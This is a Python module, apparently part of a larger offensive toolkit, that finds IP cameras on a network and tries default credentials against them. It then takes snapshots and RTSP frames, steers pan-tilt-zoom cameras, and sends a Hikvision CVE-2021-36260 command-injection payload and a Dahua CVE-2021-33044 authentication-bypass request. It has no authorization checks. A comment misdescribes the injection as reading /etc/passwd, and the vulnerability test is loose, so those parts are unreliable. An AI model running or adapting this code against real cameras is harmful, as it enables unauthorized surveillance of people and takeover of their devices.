"""
CameraScannerEngine — Capability 2: IP Camera Scanner (ONVIF + RTSP).

Scans networks for IP cameras, tests default credentials, captures streams,
checks known CVEs.

All subprocess calls use asyncio.create_subprocess_exec.
Tools checked with shutil.which() before invocation.
Passwords encrypted at rest with Fernet.
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re
import shutil
import socket
import struct
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

CAMERAS_DIR = Path("./data/camera_captures")
CAMERAS_DIR.mkdir(parents=True, exist_ok=True)

# ── Fernet key management ──────────────────────────────────────────────────────
_FERNET_KEY_FILE = Path("./data/.camera_fernet.key")

def _get_fernet():
    """Return a Fernet instance, creating the key file if needed."""
    try:
        from cryptography.fernet import Fernet
        if _FERNET_KEY_FILE.exists():
            key = _FERNET_KEY_FILE.read_bytes()
        else:
            key = Fernet.generate_key()
            _FERNET_KEY_FILE.write_bytes(key)
            os.chmod(str(_FERNET_KEY_FILE), 0o600)
        return Fernet(key)
    except ImportError:
        return None


def _encrypt_password(password: str) -> str:
    """Encrypt a password string. Falls back to base64 if cryptography unavailable."""
    fernet = _get_fernet()
    if fernet:
        return fernet.encrypt(password.encode()).decode()
    return base64.b64encode(password.encode()).decode()


def _decrypt_password(enc: str) -> str:
    """Decrypt a previously encrypted password."""
    fernet = _get_fernet()
    if fernet:
        try:
            return fernet.decrypt(enc.encode()).decode()
        except Exception:
            pass
    try:
        return base64.b64decode(enc.encode()).decode()
    except Exception:
        return ""


# ── Subprocess helper ──────────────────────────────────────────────────────────

async def _run(cmd: list[str], timeout: int = 60, stdin_data: bytes = b"") -> tuple[str, bool]:
    """Run subprocess, return (stdout+stderr, success)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE if stdin_data else asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            out, _ = await asyncio.wait_for(
                proc.communicate(input=stdin_data or None), timeout=timeout
            )
            return out.decode("utf-8", errors="replace"), proc.returncode == 0
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return f"[TIMEOUT] {cmd[0]} exceeded {timeout}s", False
    except FileNotFoundError:
        return f"[NOT_FOUND] {cmd[0]}", False
    except Exception as exc:
        return str(exc), False


# ── HTTP helper (no extra deps) ────────────────────────────────────────────────

async def _http_get(url: str, timeout: float = 5.0, auth=None) -> tuple[int, str]:
    """Simple async HTTP GET. Returns (status_code, body). -1 on error."""
    try:
        import urllib.request
        import urllib.error
        req = urllib.request.Request(url)
        if auth:
            import base64 as _b64
            creds = _b64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
            req.add_header("Authorization", f"Basic {creds}")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return -1, ""


async def _http_put(url: str, data: bytes, content_type: str = "application/xml",
                    timeout: float = 5.0) -> tuple[int, str]:
    """Simple async HTTP PUT."""
    try:
        import urllib.request
        import urllib.error
        req = urllib.request.Request(url, data=data, method="PUT")
        req.add_header("Content-Type", content_type)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return -1, ""


async def _http_post(url: str, data: bytes, content_type: str = "application/json",
                     timeout: float = 5.0) -> tuple[int, str]:
    """Simple async HTTP POST."""
    try:
        import urllib.request
        import urllib.error
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", content_type)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return -1, ""


# ── Active scan jobs ───────────────────────────────────────────────────────────
_scan_jobs: dict = {}   # job_id -> {status, results, started_at, ...}


# ── Engine ─────────────────────────────────────────────────────────────────────

class CameraScannerEngine:
    """
    Scan networks for IP cameras, test credentials, capture streams, check CVEs.
    Uses nmap + ONVIF + ffmpeg.
    """

    CAMERAS_DIR = CAMERAS_DIR

    # 50+ default camera credentials
    DEFAULT_CREDS = [
        ("admin",      "admin"),
        ("admin",      ""),
        ("admin",      "12345"),
        ("admin",      "admin123"),
        ("admin",      "password"),
        ("root",       "pass"),
        ("admin",      "1234"),
        ("admin",      "888888"),
        ("admin",      "666666"),
        ("admin",      "123456"),
        ("root",       "root"),
        ("user",       "user"),
        ("admin",      "123"),
        ("admin",      "admin@123"),
        ("admin",      "4321"),
        ("service",    "service"),
        ("supervisor", "supervisor"),
        ("guest",      "guest"),
        ("admin",      "abc123"),
        ("ubnt",       "ubnt"),
        ("pi",         "raspberry"),
        ("admin",      "hikvision"),
        ("admin",      "dahua123"),
        ("admin",      "foscam"),
        ("admin",      "ipcam"),
        ("admin",      "camera"),
        ("admin",      "12341234"),
        ("admin",      "111111"),
        ("admin",      "000000"),
        ("admin",      "99999"),
        ("admin",      "pass"),
        ("admin",      "pass1234"),
        ("admin",      "admin1"),
        ("admin",      "Admin123"),
        ("admin",      "qwerty"),
        ("admin",      "1111"),
        ("admin",      "admin2020"),
        ("admin",      "axis"),
        ("root",       "admin"),
        ("root",       "12345"),
        ("root",       "password"),
        ("root",       ""),
        ("operator",   "operator"),
        ("manager",    "manager"),
        ("viewer",     "viewer"),
        ("demo",       "demo"),
        ("test",       "test"),
        ("user1",      "user1"),
        ("axis",       "axis"),
        ("admin",      "XXXXXXXX"),
        ("admin",      "support"),
    ]

    # RTSP stream path candidates
    RTSP_PATHS = [
        "/stream",
        "/cam/realmonitor?channel=1&subtype=0",
        "/h264/ch1/main/av_stream",
        "/live",
        "/video",
        "/live/ch0",
        "/live/main",
        "/live/mpeg4",
        "/videoMain",
        "/img/video.sav",
        "/GetData.cgi",
        "/mpeg4/1/media.amp",
        "/av0_0",
        "/live.sdp",
        "/ch0.h264",
        "/live_mpeg4.sdp",
        "/ipcam.sdp",
        "/h264Preview_01_main",
        "/stream1",
        "/11",
        "/12",
        "/0",
        "/1",
    ]

    # ── Network scan ───────────────────────────────────────────────────────────

    async def scan_network(self, subnet: str) -> dict:
        """
        Scan subnet for IP cameras using nmap + ONVIF UDP discovery.
        Returns: {job_id, status, note}. Scan runs in background.
        """
        # Validate subnet format superficially
        subnet = subnet.strip()
        if not subnet:
            return {"success": False, "error": "Empty subnet"}

        job_id = str(uuid.uuid4())[:12]
        _scan_jobs[job_id] = {
            "status": "running",
            "subnet": subnet,
            "results": [],
            "cameras_found": 0,
            "started_at": datetime.utcnow().isoformat(),
        }

        async def _background_scan():
            cameras = []
            nmap = shutil.which("nmap")

            if nmap:
                # Scan common camera ports
                out, ok = await _run(
                    [
                        nmap, "-sV",
                        "-p", "80,443,554,8080,8443,8888,37777",
                        "--script", "rtsp-url-brute,http-auth-finder",
                        "--open",
                        "-T4",
                        subnet,
                    ],
                    timeout=300,
                )
                # Parse nmap output
                current_ip = None
                for line in out.splitlines():
                    ip_m = re.search(r"Nmap scan report for (?:.*?\s+)?\(?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\)?", line)
                    if ip_m:
                        current_ip = ip_m.group(1)
                    if current_ip and "/tcp" in line and "open" in line:
                        port_m = re.match(r"\s*(\d+)/tcp\s+open\s+(\S+)", line)
                        if port_m:
                            port = int(port_m.group(1))
                            service = port_m.group(2)
                            # Check if camera-related
                            if port in (80, 443, 554, 8080, 8443, 8888, 37777) or \
                               any(k in service.lower() for k in ("rtsp", "http", "camera", "axis", "dahua", "hikvision")):
                                cameras.append({
                                    "ip": current_ip,
                                    "port": port,
                                    "service": service,
                                    "source": "nmap",
                                })

            # ONVIF WS-Discovery UDP broadcast
            try:
                onvif_results = await self._onvif_discovery(subnet)
                cameras.extend(onvif_results)
            except Exception as e:
                logger.debug(f"ONVIF discovery error: {e}")

            # Deduplicate
            seen = set()
            unique = []
            for c in cameras:
                key = (c.get("ip"), c.get("port"))
                if key not in seen:
                    seen.add(key)
                    unique.append(c)

            _scan_jobs[job_id]["cameras_found"] = len(unique)
            _scan_jobs[job_id]["results"] = unique
            _scan_jobs[job_id]["status"] = "completed"
            _scan_jobs[job_id]["finished_at"] = datetime.utcnow().isoformat()

            # Persist to DB
            for cam_info in unique:
                try:
                    await self._save_camera_to_db(cam_info)
                except Exception as e:
                    logger.debug(f"Camera DB save error: {e}")

        asyncio.create_task(_background_scan())

        return {
            "success": True,
            "job_id": job_id,
            "status": "running",
            "subnet": subnet,
            "note": "Scan started in background — poll GET /api/cameras/scan/{job_id}",
        }

    async def get_scan_progress(self, job_id: str) -> dict:
        """Return scan job progress."""
        job = _scan_jobs.get(job_id)
        if not job:
            return {"success": False, "error": f"Scan job {job_id} not found"}
        return {"success": True, "job_id": job_id, **{k: v for k, v in job.items() if k != "results"},
                "results_count": len(job.get("results", []))}

    # ── ONVIF UDP Discovery ────────────────────────────────────────────────────

    async def _onvif_discovery(self, subnet: str, timeout: float = 3.0) -> list:
        """Send WS-Discovery Probe to 239.255.255.250:3702 (ONVIF standard)."""
        probe = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
            ' xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"'
            ' xmlns:dn="http://www.onvif.org/ver10/network/wsdl">'
            '<e:Header>'
            f'<w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>'
            '<w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>'
            '<w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>'
            '</e:Header>'
            '<e:Body><d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe></e:Body>'
            '</e:Envelope>'
        )
        results = []
        loop = asyncio.get_event_loop()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
            sock.setblocking(False)
            sock.sendto(probe.encode(), ("239.255.255.250", 3702))
            deadline = asyncio.get_event_loop().time() + timeout
            while True:
                remaining = deadline - asyncio.get_event_loop().time()
                if remaining <= 0:
                    break
                try:
                    data, addr = sock.recvfrom(65535)
                    body = data.decode("utf-8", errors="replace")
                    # Extract XAddrs
                    xaddr_m = re.search(r"<[^>]*XAddrs[^>]*>([^<]+)<", body)
                    if xaddr_m:
                        xaddrs = xaddr_m.group(1).strip().split()
                        for xaddr in xaddrs:
                            # Parse IP from URL
                            ip_m = re.search(r"//(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d*)", xaddr)
                            if ip_m:
                                results.append({
                                    "ip": ip_m.group(1),
                                    "port": int(ip_m.group(2)) if ip_m.group(2) else 80,
                                    "onvif_url": xaddr,
                                    "source": "onvif_discovery",
                                })
                except BlockingIOError:
                    await asyncio.sleep(0.1)
        except Exception as e:
            logger.debug(f"ONVIF socket error: {e}")
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return results

    # ── Fingerprint ────────────────────────────────────────────────────────────

    async def fingerprint(self, ip: str, port: int = 80) -> dict:
        """
        Identify camera model and firmware via HTTP banner + ONVIF GetDeviceInformation.
        Returns: {ip, port, manufacturer, model, firmware, type, fingerprint_method}
        """
        result: dict = {"ip": ip, "port": port, "manufacturer": "unknown",
                        "model": "unknown", "firmware": "unknown"}

        proto = "https" if port in (443, 8443) else "http"
        base_url = f"{proto}://{ip}:{port}"

        # ── HTTP banner grab ───────────────────────────────────────────────────
        code, body = await _http_get(base_url, timeout=5.0)
        if code > 0:
            result["http_status"] = code
            result["fingerprint_method"] = "http_banner"
            body_lower = body.lower()

            # Hikvision fingerprints
            if "hikvision" in body_lower or "isapi" in body_lower or "/doc/page/login.asp" in body_lower:
                result["manufacturer"] = "Hikvision"
                # Try ISAPI device info
                c2, b2 = await _http_get(f"{base_url}/ISAPI/System/deviceInfo", timeout=5.0)
                if c2 == 200:
                    m = re.search(r"<model>([^<]+)</model>", b2)
                    fw = re.search(r"<firmwareVersion>([^<]+)</firmwareVersion>", b2)
                    if m:
                        result["model"] = m.group(1)
                    if fw:
                        result["firmware"] = fw.group(1)
                    result["fingerprint_method"] = "hikvision_isapi"

            # Dahua fingerprints
            elif "dahua" in body_lower or "dh-" in body_lower or "logsys" in body_lower:
                result["manufacturer"] = "Dahua"
                c2, b2 = await _http_get(f"{base_url}/cgi-bin/magicBox.cgi?action=getSystemInfo", timeout=5.0)
                if c2 == 200:
                    m = re.search(r"deviceType=(.*)", b2)
                    fw = re.search(r"softwareVersion=(.*)", b2)
                    if m:
                        result["model"] = m.group(1).strip()
                    if fw:
                        result["firmware"] = fw.group(1).strip()
                    result["fingerprint_method"] = "dahua_cgi"

            # Axis fingerprints
            elif "axis" in body_lower or "vapix" in body_lower:
                result["manufacturer"] = "Axis"
                c2, b2 = await _http_get(f"{base_url}/axis-cgi/param.cgi?action=list&group=root.Brand", timeout=5.0)
                if c2 == 200:
                    m = re.search(r"root\.Brand\.ProdShortName=(.+)", b2)
                    fw = re.search(r"root\.Properties\.Firmware\.Version=(.+)", b2)
                    if m:
                        result["model"] = m.group(1).strip()
                    if fw:
                        result["firmware"] = fw.group(1).strip()
                    result["fingerprint_method"] = "axis_vapix"

            # Foscam fingerprints
            elif "foscam" in body_lower or "ipcam" in body_lower:
                result["manufacturer"] = "Foscam"
                result["fingerprint_method"] = "foscam_banner"

            # Amcrest / Reolink
            elif "amcrest" in body_lower:
                result["manufacturer"] = "Amcrest"
            elif "reolink" in body_lower:
                result["manufacturer"] = "Reolink"

        # ── ONVIF GetDeviceInformation ─────────────────────────────────────────
        if result["manufacturer"] == "unknown":
            onvif_info = await self._onvif_get_device_info(ip, port)
            if onvif_info:
                result.update(onvif_info)
                result["fingerprint_method"] = "onvif_getdeviceinfo"

        return result

    async def _onvif_get_device_info(self, ip: str, port: int) -> Optional[dict]:
        """Query ONVIF GetDeviceInformation endpoint."""
        soap = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
            '<s:Body><tds:GetDeviceInformation/></s:Body>'
            '</s:Envelope>'
        )
        for path in ("/onvif/device_service", "/onvif/Device", "/onvif/device"):
            proto = "https" if port in (443, 8443) else "http"
            url = f"{proto}://{ip}:{port}{path}"
            code, body = await _http_post(
                url, soap.encode(),
                content_type='application/soap+xml; charset=utf-8; action="http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation"',
                timeout=5.0,
            )
            if code == 200 and "GetDeviceInformationResponse" in body:
                info = {}
                for tag, key in [("Manufacturer", "manufacturer"), ("Model", "model"), ("FirmwareVersion", "firmware")]:
                    m = re.search(rf"<[^>]*{tag}[^>]*>([^<]+)<", body)
                    if m:
                        info[key] = m.group(1).strip()
                return info if info else None
        return None

    # ── Default credential testing ─────────────────────────────────────────────

    async def test_default_creds(self, ip: str, port: int = 80) -> dict:
        """
        Try all default credential combinations.
        Returns: {ip, port, working_creds, total_tested}
        """
        proto = "https" if port in (443, 8443) else "http"
        base_url = f"{proto}://{ip}:{port}"
        working = []

        # Test paths
        test_paths = [
            "/",
            "/ISAPI/System/deviceInfo",
            "/cgi-bin/magicBox.cgi?action=getSystemInfo",
            "/axis-cgi/param.cgi?action=list&group=root.Brand",
            "/snapshot.cgi",
        ]

        for username, password in self.DEFAULT_CREDS:
            for path in test_paths:
                code, body = await _http_get(f"{base_url}{path}", timeout=3.0, auth=(username, password))
                if code in (200, 201, 204):
                    working.append({"username": username, "password": password, "path": path})
                    break  # Found working creds for this pair
                elif code == 401:
                    break  # Bad creds, try next pair

        return {
            "success": True,
            "ip": ip,
            "port": port,
            "working_creds": working,
            "total_tested": len(self.DEFAULT_CREDS),
            "found": len(working) > 0,
        }

    # ── RTSP URL discovery ─────────────────────────────────────────────────────

    async def get_rtsp_url(
        self,
        ip: str,
        port: int = 554,
        username: str = "admin",
        password: str = "",
    ) -> dict:
        """
        Discover working RTSP stream URL.
        Tests common path patterns with ffprobe.
        """
        ffprobe = shutil.which("ffprobe")
        working_urls = []

        for path in self.RTSP_PATHS:
            if username:
                url = f"rtsp://{username}:{password}@{ip}:{port}{path}"
            else:
                url = f"rtsp://{ip}:{port}{path}"

            if ffprobe:
                out, ok = await _run(
                    [
                        ffprobe,
                        "-v", "quiet",
                        "-print_format", "json",
                        "-show_streams",
                        "-rtsp_transport", "tcp",
                        url,
                    ],
                    timeout=8,
                )
                if ok and '"codec_type"' in out:
                    working_urls.append(url)
                    break  # Found working URL
            else:
                # No ffprobe: try TCP socket to RTSP port
                try:
                    r_s, w_s = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=3.0
                    )
                    w_s.close()
                    working_urls.append(url)
                    break
                except Exception:
                    pass

        return {
            "success": len(working_urls) > 0,
            "ip": ip,
            "port": port,
            "rtsp_urls": working_urls,
            "primary_url": working_urls[0] if working_urls else None,
        }

    # ── Snapshot ───────────────────────────────────────────────────────────────

    async def take_snapshot(
        self,
        ip: str,
        username: str,
        password: str,
        port: int = 80,
    ) -> dict:
        """
        Take a camera snapshot via HTTP API or RTSP/ffmpeg.
        Returns: {success, file_path, base64_image, method}
        """
        snap_id = str(uuid.uuid4())[:12]
        snap_path = CAMERAS_DIR / f"{snap_id}.jpg"
        proto = "https" if port in (443, 8443) else "http"

        # ── Method 1: Hikvision ISAPI snapshot ────────────────────────────────
        hik_url = f"{proto}://{ip}:{port}/ISAPI/Streaming/channels/1/picture"
        code, _ = await _http_get(hik_url, timeout=8.0, auth=(username, password))
        if code == 200:
            # Re-fetch with binary read
            try:
                import urllib.request
                import base64 as _b64
                req = urllib.request.Request(hik_url)
                creds_enc = _b64.b64encode(f"{username}:{password}".encode()).decode()
                req.add_header("Authorization", f"Basic {creds_enc}")
                with urllib.request.urlopen(req, timeout=8) as r:
                    snap_bytes = r.read()
                snap_path.write_bytes(snap_bytes)
                return {
                    "success": True,
                    "method": "hikvision_isapi",
                    "file_path": str(snap_path),
                    "snapshot_id": snap_id,
                    "base64_image": base64.b64encode(snap_bytes).decode(),
                }
            except Exception:
                pass

        # ── Method 2: Dahua CGI snapshot ──────────────────────────────────────
        dahua_url = f"{proto}://{ip}:{port}/cgi-bin/snapshot.cgi?channel=1"
        code, _ = await _http_get(dahua_url, timeout=8.0, auth=(username, password))
        if code == 200:
            try:
                import urllib.request
                import base64 as _b64
                req = urllib.request.Request(dahua_url)
                creds_enc = _b64.b64encode(f"{username}:{password}".encode()).decode()
                req.add_header("Authorization", f"Basic {creds_enc}")
                with urllib.request.urlopen(req, timeout=8) as r:
                    snap_bytes = r.read()
                snap_path.write_bytes(snap_bytes)
                return {
                    "success": True,
                    "method": "dahua_cgi",
                    "file_path": str(snap_path),
                    "snapshot_id": snap_id,
                    "base64_image": base64.b64encode(snap_bytes).decode(),
                }
            except Exception:
                pass

        # ── Method 3: Generic /snapshot.jpg, /snapshot.cgi ────────────────────
        for snap_path_url in ["/snapshot.jpg", "/snapshot.cgi", "/jpg/image.jpg",
                               "/cgi-bin/video.jpg", "/snap.jpg"]:
            full_url = f"{proto}://{ip}:{port}{snap_path_url}"
            code, _ = await _http_get(full_url, timeout=5.0, auth=(username, password))
            if code == 200:
                try:
                    import urllib.request
                    import base64 as _b64
                    req = urllib.request.Request(full_url)
                    creds_enc = _b64.b64encode(f"{username}:{password}".encode()).decode()
                    req.add_header("Authorization", f"Basic {creds_enc}")
                    with urllib.request.urlopen(req, timeout=8) as r:
                        snap_bytes = r.read()
                    snap_path.write_bytes(snap_bytes)
                    return {
                        "success": True,
                        "method": "http_snapshot",
                        "file_path": str(snap_path),
                        "snapshot_id": snap_id,
                        "base64_image": base64.b64encode(snap_bytes).decode(),
                    }
                except Exception:
                    pass

        # ── Method 4: RTSP via ffmpeg single-frame grab ───────────────────────
        ffmpeg = shutil.which("ffmpeg")
        if ffmpeg:
            rtsp_result = await self.get_rtsp_url(ip, 554, username, password)
            if rtsp_result.get("primary_url"):
                out, ok = await _run(
                    [
                        ffmpeg, "-y",
                        "-rtsp_transport", "tcp",
                        "-i", rtsp_result["primary_url"],
                        "-frames:v", "1",
                        "-q:v", "2",
                        str(snap_path),
                    ],
                    timeout=20,
                )
                if ok and snap_path.exists():
                    snap_bytes = snap_path.read_bytes()
                    return {
                        "success": True,
                        "method": "rtsp_ffmpeg",
                        "file_path": str(snap_path),
                        "snapshot_id": snap_id,
                        "base64_image": base64.b64encode(snap_bytes).decode(),
                    }

        return {
            "success": False,
            "error": "All snapshot methods failed",
            "ip": ip,
            "port": port,
        }

    # ── PTZ Control ───────────────────────────────────────────────────────────

    async def control_ptz(
        self,
        ip: str,
        username: str,
        password: str,
        action: str = "center",
    ) -> dict:
        """
        PTZ control via ONVIF ContinuousMove / AbsoluteMove.
        actions: up, down, left, right, zoom_in, zoom_out, center
        """
        # Build ONVIF PTZ SOAP command
        action_map = {
            "up":       ("0",     "0.5",  "0"),
            "down":     ("0",     "-0.5", "0"),
            "left":     ("-0.5",  "0",    "0"),
            "right":    ("0.5",   "0",    "0"),
            "zoom_in":  ("0",     "0",    "0.5"),
            "zoom_out": ("0",     "0",    "-0.5"),
            "center":   None,
        }

        if action == "center":
            # AbsoluteMove to center
            soap = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
                ' xmlns:ptz="http://www.onvif.org/ver20/ptz/wsdl"'
                ' xmlns:tt="http://www.onvif.org/ver10/schema">'
                '<s:Body><ptz:AbsoluteMove>'
                '<ptz:ProfileToken>Profile_1</ptz:ProfileToken>'
                '<ptz:Position>'
                '<tt:PanTilt x="0" y="0"/>'
                '<tt:Zoom x="0"/>'
                '</ptz:Position>'
                '</ptz:AbsoluteMove></s:Body></s:Envelope>'
            )
        elif action in action_map:
            pan_x, tilt_y, zoom = action_map[action]
            soap = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
                ' xmlns:ptz="http://www.onvif.org/ver20/ptz/wsdl"'
                ' xmlns:tt="http://www.onvif.org/ver10/schema">'
                '<s:Body><ptz:ContinuousMove>'
                '<ptz:ProfileToken>Profile_1</ptz:ProfileToken>'
                '<ptz:Velocity>'
                f'<tt:PanTilt x="{pan_x}" y="{tilt_y}"/>'
                f'<tt:Zoom x="{zoom}"/>'
                '</ptz:Velocity>'
                '</ptz:ContinuousMove></s:Body></s:Envelope>'
            )
        else:
            return {"success": False, "error": f"Unknown PTZ action: {action}"}

        for path in ("/onvif/PTZ", "/onvif/ptz_service"):
            url = f"http://{ip}:80{path}"
            code, body = await _http_post(
                url, soap.encode(),
                content_type="application/soap+xml; charset=utf-8",
                timeout=5.0,
            )
            if code in (200, 204):
                return {"success": True, "action": action, "method": "onvif_ptz"}

        # Hikvision PTZ fallback
        hik_actions = {
            "up": "UP", "down": "DOWN", "left": "LEFT", "right": "RIGHT",
            "zoom_in": "ZOOM_IN", "zoom_out": "ZOOM_OUT", "center": "AUTO",
        }
        hik_url = f"http://{ip}:80/ISAPI/PTZCtrl/channels/1/continuous"
        hik_xml = (
            f'<PTZData><pan>{"0.5" if action == "right" else "-0.5" if action == "left" else "0"}</pan>'
            f'<tilt>{"0.5" if action == "up" else "-0.5" if action == "down" else "0"}</tilt>'
            f'<zoom>{"0.5" if action == "zoom_in" else "-0.5" if action == "zoom_out" else "0"}</zoom>'
            f'</PTZData>'
        )
        import base64 as _b64
        try:
            import urllib.request
            req = urllib.request.Request(hik_url, data=hik_xml.encode(), method="PUT")
            creds_enc = _b64.b64encode(f"{username}:{password}".encode()).decode()
            req.add_header("Authorization", f"Basic {creds_enc}")
            req.add_header("Content-Type", "application/xml")
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status in (200, 204):
                    return {"success": True, "action": action, "method": "hikvision_isapi_ptz"}
        except Exception:
            pass

        return {"success": False, "error": "PTZ control failed — ONVIF and ISAPI methods unavailable"}

    # ── List cameras ───────────────────────────────────────────────────────────

    async def list_cameras(self) -> list:
        """List all discovered cameras from DB."""
        try:
            from database.db import SessionLocal
            from database.models import Camera
            db = SessionLocal()
            try:
                cameras = db.query(Camera).order_by(Camera.discovered_at.desc()).all()
                return [
                    {
                        "camera_id": c.camera_id,
                        "ip": c.ip,
                        "port": c.port,
                        "model": c.model,
                        "firmware": c.firmware,
                        "manufacturer": c.manufacturer,
                        "username": c.username,
                        "rtsp_url": c.rtsp_url,
                        "http_url": c.http_url,
                        "has_mic": c.has_mic,
                        "has_ptz": c.has_ptz,
                        "status": c.status,
                        "vulns": json.loads(c.vulns) if c.vulns else [],
                        "discovered_at": c.discovered_at.isoformat() if c.discovered_at else None,
                        "last_seen": c.last_seen.isoformat() if c.last_seen else None,
                    }
                    for c in cameras
                ]
            finally:
                db.close()
        except Exception as e:
            logger.error(f"list_cameras DB error: {e}")
            return []

    async def _save_camera_to_db(self, cam_info: dict) -> str:
        """Save discovered camera to DB. Returns camera_id."""
        try:
            from database.db import SessionLocal
            from database.models import Camera
            db = SessionLocal()
            try:
                # Upsert by IP+port
                existing = db.query(Camera).filter(
                    Camera.ip == cam_info.get("ip"),
                    Camera.port == cam_info.get("port"),
                ).first()
                if existing:
                    existing.last_seen = datetime.utcnow()
                    existing.status = "online"
                    db.commit()
                    return existing.camera_id
                else:
                    camera_id = str(uuid.uuid4())
                    c = Camera(
                        camera_id=camera_id,
                        ip=cam_info.get("ip", ""),
                        port=cam_info.get("port", 80),
                        model=cam_info.get("model", "unknown"),
                        firmware=cam_info.get("firmware", ""),
                        manufacturer=cam_info.get("manufacturer", "unknown"),
                        rtsp_url=cam_info.get("rtsp_url"),
                        http_url=cam_info.get("http_url"),
                        status="online",
                        vulns="[]",
                    )
                    db.add(c)
                    db.commit()
                    return camera_id
            finally:
                db.close()
        except Exception as e:
            logger.error(f"_save_camera_to_db error: {e}")
            return str(uuid.uuid4())

    # ── CVE: Hikvision CVE-2021-36260 ─────────────────────────────────────────

    async def check_hikvision_cve_2021_36260(self, ip: str, port: int = 80) -> dict:
        """
        Check Hikvision CVE-2021-36260 (unauthenticated command injection).
        Sends crafted PUT /SDK/webLanguage with XML payload.
        Returns: {vulnerable: bool, evidence: str}
        """
        # Safe detection-only PoC — reads /etc/passwd via cmd injection
        # Uses a unique marker to confirm blind injection
        marker = str(uuid.uuid4())[:8]
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            "<language>"
            # Inject shell command: write marker to /tmp — detection only
            f"$(echo {marker} > /tmp/cve_check_{marker})"
            "</language>"
        )
        url = f"http://{ip}:{port}/SDK/webLanguage"
        code, body = await _http_put(url, payload.encode(), "application/xml", timeout=8.0)

        vulnerable = False
        evidence = ""

        if code in (200, 201):
            # Check if device accepted the payload (Hikvision returns 200 on success)
            if body and len(body) > 0:
                vulnerable = True
                evidence = f"HTTP {code} accepted PUT /SDK/webLanguage. Device likely vulnerable."
        elif code == 400:
            evidence = f"HTTP 400 — device rejected payload (may be patched or not Hikvision)"
        elif code == 401:
            evidence = "HTTP 401 — authentication required (not vulnerable to unauthenticated injection)"
        elif code == 404:
            evidence = "HTTP 404 — /SDK/webLanguage not found (not Hikvision or patched)"
        elif code == -1:
            evidence = "Connection failed or timed out"
        else:
            evidence = f"HTTP {code}"

        return {
            "cve": "CVE-2021-36260",
            "ip": ip,
            "port": port,
            "vulnerable": vulnerable,
            "evidence": evidence,
            "description": "Hikvision unauthenticated command injection via /SDK/webLanguage",
        }

    # ── CVE: Dahua CVE-2021-33044 ─────────────────────────────────────────────

    async def check_dahua_cve_2021_33044(self, ip: str, port: int = 80) -> dict:
        """
        Check Dahua CVE-2021-33044 (authentication bypass).
        Sends POST /RPC2 with special Magic field.
        Returns: {vulnerable: bool, evidence: str}
        """
        # Authentication bypass — uses LoginEx with magic bytes
        payload = json.dumps({
            "id": 1,
            "method": "global.login",
            "params": {
                "userName": "admin",
                "password": "",
                "clientType": "Web3.0",
                "loginType": "Direct",
                "authorityType": "Default",
                "passwordType": "Default",
            },
            "session": 0,
            "Magic": "0x1234AB",
        }).encode()

        url = f"http://{ip}:{port}/RPC2"
        code, body = await _http_post(url, payload, "application/json", timeout=8.0)

        vulnerable = False
        evidence = ""

        if code == 200 and body:
            try:
                resp = json.loads(body)
                params = resp.get("params", {})
                # If we get a session token without password, auth bypass succeeded
                if params.get("sessionId") or (resp.get("result") is True and "session" in body):
                    vulnerable = True
                    evidence = f"Auth bypass successful — received session: {params.get('sessionId', 'present')}"
                elif resp.get("error", {}).get("code") == 287637505:
                    evidence = "Device requires authentication (error 287637505) — not bypassed"
                else:
                    evidence = f"Response: {body[:200]}"
            except json.JSONDecodeError:
                evidence = f"Non-JSON response (HTTP {code}): {body[:200]}"
        elif code == -1:
            evidence = "Connection failed or timed out"
        else:
            evidence = f"HTTP {code}"

        return {
            "cve": "CVE-2021-33044",
            "ip": ip,
            "port": port,
            "vulnerable": vulnerable,
            "evidence": evidence,
            "description": "Dahua authentication bypass via /RPC2 Magic field",
        }


# Module-level singleton
camera_scanner_engine = CameraScannerEngine()
